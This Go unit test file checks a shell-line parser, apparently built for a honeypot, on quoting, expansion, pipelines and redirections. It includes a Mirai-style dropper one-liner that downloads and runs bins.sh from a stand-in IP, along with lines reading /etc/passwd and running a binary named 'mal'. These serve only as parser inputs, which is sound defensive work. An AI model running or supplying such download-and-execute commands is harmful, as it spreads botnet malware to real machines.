package shell

import (
	"strings"
	"testing"
)

// testExp is a fixed environment for parser tests.
type testExp struct {
	vars  map[string]string
	homes map[string]string
}

func (e testExp) Var(name string) (string, bool) { v, ok := e.vars[name]; return v, ok }
func (e testExp) Home(user string) (string, bool) {
	if user == "" {
		user = "root"
	}
	v, ok := e.homes[user]
	return v, ok
}

func exp() testExp {
	return testExp{
		vars:  map[string]string{"HOME": "/root", "USER": "root", "PATH": "/usr/bin:/bin", "x": "1", "FOO": "bar baz", "?": "0", "$": "742"},
		homes: map[string]string{"root": "/root", "martin": "/home/martin"},
	}
}

// argv is a helper: parse a line that must be a single simple command and
// return its argv.
func argv(t *testing.T, line string) []string {
	t.Helper()
	ao, err := Parse(line, exp())
	if err != nil {
		t.Fatalf("Parse(%q): %v", line, err)
	}
	if len(ao.Pipelines) != 1 || len(ao.Pipelines[0].Cmds) != 1 {
		t.Fatalf("Parse(%q) = %d pipelines", line, len(ao.Pipelines))
	}
	return ao.Pipelines[0].Cmds[0].Args
}

func eq(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func TestWordSplittingAndQuotes(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{`ls -la /tmp`, []string{"ls", "-la", "/tmp"}},
		{`echo   spaced    out`, []string{"echo", "spaced", "out"}},
		{`echo "hello world"`, []string{"echo", "hello world"}},
		{`echo 'single $x quotes'`, []string{"echo", "single $x quotes"}},
		{`echo "mix '$x' here"`, []string{"echo", "mix '1' here"}},
		{`echo a"b"c'd'e`, []string{"echo", "abcde"}},
		{`echo \$x`, []string{"echo", "$x"}},
		{`echo \\ `, []string{"echo", `\`}},
		{`echo "a\"b"`, []string{"echo", `a"b`}},
		{`echo ""`, []string{"echo", ""}},
		{`grep -r "TODO" .`, []string{"grep", "-r", "TODO", "."}},
		{`echo foo#bar`, []string{"echo", "foo#bar"}},
		{`echo # a comment`, []string{"echo"}},
	}
	for _, c := range cases {
		if got := argv(t, c.line); !eq(got, c.want) {
			t.Errorf("argv(%q) = %q, want %q", c.line, got, c.want)
		}
	}
}

func TestExpansion(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{`echo $x`, []string{"echo", "1"}},
		{`echo ${USER}`, []string{"echo", "root"}},
		{`echo $USER-$x`, []string{"echo", "root-1"}},
		{`echo "$FOO"`, []string{"echo", "bar baz"}},
		{`echo $FOO`, []string{"echo", "bar", "baz"}}, // unquoted: word-split
		{`echo $undefined end`, []string{"echo", "end"}},
		{`echo "$undefined"end`, []string{"echo", "end"}},
		{`echo $?`, []string{"echo", "0"}},
		{`echo $$`, []string{"echo", "742"}},
		{`echo ${HOME}/bin`, []string{"echo", "/root/bin"}},
		{`echo ${VAR:-default}`, []string{"echo"}}, // name VAR unset -> empty (we don't do :- yet, name stripped)
		{`cat ~/notes`, []string{"cat", "/root/notes"}},
		{`cat ~martin/.bashrc`, []string{"cat", "/home/martin/.bashrc"}},
		{`cat ~nobody/x`, []string{"cat", "~nobody/x"}},
		{`echo $(whoami)`, []string{"echo"}}, // command substitution yields empty
		{`echo pre$(id)post`, []string{"echo", "prepost"}},
	}
	for _, c := range cases {
		if got := argv(t, c.line); !eq(got, c.want) {
			t.Errorf("argv(%q) = %q, want %q", c.line, got, c.want)
		}
	}
}

func TestAssignments(t *testing.T) {
	ao, err := Parse(`FOO=bar BAZ=$x ls -l`, exp())
	if err != nil {
		t.Fatal(err)
	}
	cmd := ao.Pipelines[0].Cmds[0]
	if !eq(cmd.Assigns, []string{"FOO=bar", "BAZ=1"}) {
		t.Errorf("assigns = %q", cmd.Assigns)
	}
	if !eq(cmd.Args, []string{"ls", "-l"}) {
		t.Errorf("args = %q", cmd.Args)
	}
	// A bare assignment is its own command with no args.
	ao, _ = Parse(`X=5`, exp())
	if a := ao.Pipelines[0].Cmds[0].Assigns; !eq(a, []string{"X=5"}) {
		t.Errorf("bare assign = %q", a)
	}
	// After the command word, NAME=val is a normal argument.
	if got := argv(t, `echo FOO=bar`); !eq(got, []string{"echo", "FOO=bar"}) {
		t.Errorf("post-command assign = %q", got)
	}
}

func TestPipelinesAndLists(t *testing.T) {
	ao, err := Parse(`cat /etc/passwd | grep root | wc -l`, exp())
	if err != nil {
		t.Fatal(err)
	}
	if len(ao.Pipelines) != 1 || len(ao.Pipelines[0].Cmds) != 3 {
		t.Fatalf("pipeline = %+v", ao)
	}
	if ao.Pipelines[0].Cmds[1].Args[0] != "grep" {
		t.Error("middle command wrong")
	}

	ao, _ = Parse(`cd /tmp && wget http://x/y ; ls || echo fail`, exp())
	if len(ao.Pipelines) != 4 {
		t.Fatalf("got %d pipelines", len(ao.Pipelines))
	}
	if !eq(ao.Ops, []string{"&&", ";", "||"}) {
		t.Errorf("ops = %q", ao.Ops)
	}

	ao, _ = Parse(`sleep 10 &`, exp())
	if !ao.Background {
		t.Error("expected background")
	}
}

func TestRedirections(t *testing.T) {
	ao, err := Parse(`echo hi > /tmp/out 2>> /tmp/err < /dev/null`, exp())
	if err != nil {
		t.Fatal(err)
	}
	cmd := ao.Pipelines[0].Cmds[0]
	want := []Redirect{{">", "/tmp/out"}, {"2>>", "/tmp/err"}, {"<", "/dev/null"}}
	if len(cmd.Redirects) != 3 {
		t.Fatalf("redirects = %+v", cmd.Redirects)
	}
	for i, w := range want {
		if cmd.Redirects[i] != w {
			t.Errorf("redirect %d = %+v, want %+v", i, cmd.Redirects[i], w)
		}
	}
	if !eq(cmd.Args, []string{"echo", "hi"}) {
		t.Errorf("args = %q", cmd.Args)
	}
	// &> and append.
	ao, _ = Parse(`./mal &>/dev/null`, exp())
	if r := ao.Pipelines[0].Cmds[0].Redirects; len(r) != 1 || r[0].Op != "&>" || r[0].Target != "/dev/null" {
		t.Errorf("&> = %+v", r)
	}
	ao, _ = Parse(`echo x>>log`, exp())
	if r := ao.Pipelines[0].Cmds[0].Redirects; len(r) != 1 || r[0].Op != ">>" {
		t.Errorf(">> = %+v", r)
	}
}

func TestSyntaxErrors(t *testing.T) {
	bad := []string{`echo "unterminated`, `echo 'unterminated`, `| grep x`, `echo x &&`, `echo x |`, `ls > `}
	for _, line := range bad {
		if _, err := Parse(line, exp()); err == nil {
			t.Errorf("Parse(%q) should have failed", line)
		}
	}
	good := []string{``, `   `, `# just a comment`, `ls;`, `ls ;`}
	for _, line := range good {
		if _, err := Parse(line, exp()); err != nil {
			t.Errorf("Parse(%q) should be ok: %v", line, err)
		}
	}
}

func TestRealMiraiStyleLine(t *testing.T) {
	// The kind of one-liner honeypots see constantly.
	line := `cd /tmp || cd /var/run || cd /mnt || cd /root; wget http://198.51.100.23/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh`
	ao, err := Parse(line, exp())
	if err != nil {
		t.Fatal(err)
	}
	if len(ao.Pipelines) != 8 {
		t.Fatalf("got %d pipelines: %+v", len(ao.Pipelines), ao.Ops)
	}
	// The wget URL survives intact.
	found := false
	for _, pl := range ao.Pipelines {
		c := pl.Cmds[0]
		if c.Args[0] == "wget" && strings.Contains(c.Args[1], "198.51.100.23") {
			found = true
		}
	}
	if !found {
		t.Error("wget URL not preserved")
	}
}
